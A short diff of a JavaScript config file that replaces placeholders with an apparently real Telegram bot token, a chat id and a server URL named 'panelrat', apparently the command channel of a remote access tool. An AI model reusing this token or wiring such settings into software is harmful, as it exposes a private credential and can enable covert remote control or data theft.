@@ -1,5 +1,5 @@
 module.exports = {
-  token: "YOUR_TELEGRAM_BOT_TOKEN",
-  id:"Enter Your Id",
-  address:"Enter your url"
+  token: "7483662617:AAGAbWB7EedeiwkdQf82J3MrthfXrd3ydyU",
+  id:"7630779035",
+  address:"https://panelrat.onrender.com"
 };
